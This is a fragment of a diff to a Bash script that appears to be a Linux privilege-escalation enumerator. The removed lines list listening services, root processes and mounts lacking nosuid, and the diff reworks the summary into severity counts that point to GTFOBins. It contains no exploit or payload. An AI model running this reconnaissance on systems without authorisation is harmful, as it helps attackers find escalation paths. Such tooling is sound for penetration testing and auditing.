-echo -e "\n  ${BOLD}Listening services:${NC}"
-if command -v ss &>/dev/null; then
-    ss -tlnp 2>/dev/null | grep -v '^State' | while IFS= read -r line; do
-        echo -e "    $line"
-    done
-elif command -v netstat &>/dev/null; then
-    netstat -tlnp 2>/dev/null | grep -v '^Proto' | grep -v '^Active' | while IFS= read -r line; do
-        echo -e "    $line"
-    done
-fi
-
-# --- Root processes (non-kernel) ---
-ROOT_PROCS=$(ps aux 2>/dev/null | awk '$1 == "root"' | grep -vE '(\[.*\]|/sbin/init|systemd$|systemd-|/lib/systemd)' | head -15)
-if [ -n "$ROOT_PROCS" ]; then
-    echo -e "\n  ${BOLD}Interesting root processes:${NC}"
-    echo "$ROOT_PROCS" | while IFS= read -r line; do
-        echo -e "    $line"
-    done
-fi
-
-# --- Mounts without nosuid ---
-NOSUID_MISSING=$(mount 2>/dev/null | grep -vE '(proc|sys|devpts|tmpfs|cgroup|securityfs|debugfs|mqueue|hugetlb|pstore|bpf|fusectl|configfs|devtmpfs)' | grep -v "nosuid")
-if [ -n "$NOSUID_MISSING" ]; then
-    echo -e "\n  ${BOLD}Mounts without nosuid (SUID binaries can run):${NC}"
-    echo "$NOSUID_MISSING" | while IFS= read -r line; do
-        echo -e "    $line"
-    done
-fi
-
-# --- Summary ---
-echo ""
-echo -e "${BOLD}══════════════════════════════════════════════════════${NC}"
-if [ "$FOUND" -gt 0 ]; then
-    echo -e "${GREEN}${BOLD}  $FOUND findings total${NC}"
-    [ "$FOUND_GTFO" -gt 0 ] && echo -e "  ${GREEN}├─ $FOUND_GTFO GTFOBins exploitable${NC}"
-    [ "$FOUND_OTHER_USER" -gt 0 ] && echo -e "  ${YELLOW}├─ $FOUND_OTHER_USER run-as-other-user (lateral movement)${NC}"
-    [ "$FOUND_EXTRA" -gt 0 ] && echo -e "  ${CYAN}├─ $FOUND_EXTRA extended privesc checks${NC}"
-    OTHER=$((FOUND - FOUND_GTFO - FOUND_OTHER_USER - FOUND_EXTRA))
-    [ "$OTHER" -gt 0 ] && echo -e "  ${CYAN}└─ $OTHER other interesting files${NC}"
-    echo -e "  Reference: ${CYAN}https://gtfobins.github.io/${NC}"
-else
-    echo -e "${YELLOW}  No known exploitables found.${NC}"
-fi
-echo -e "${BOLD}══════════════════════════════════════════════════════${NC}"
+echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+[ "$C_CRIT" -gt 0 ] && echo -e "  ${RED}${BOLD}$C_CRIT CRITICAL${NC}  — start here"
+[ "$C_HIGH" -gt 0 ] && echo -e "  ${YELLOW}$C_HIGH HIGH${NC}"
+[ "$C_MED"  -gt 0 ] && echo -e "  ${CYAN}$C_MED MEDIUM${NC}"
+[ "$C_INFO" -gt 0 ] && echo -e "  $C_INFO INFO"
+[ "$VERBOSE" -eq 0 ] && echo -e "  ${CYAN}run with -v for recon context${NC}"
+echo -e "  ref: ${CYAN}https://gtfobins.github.io/${NC}"
+echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
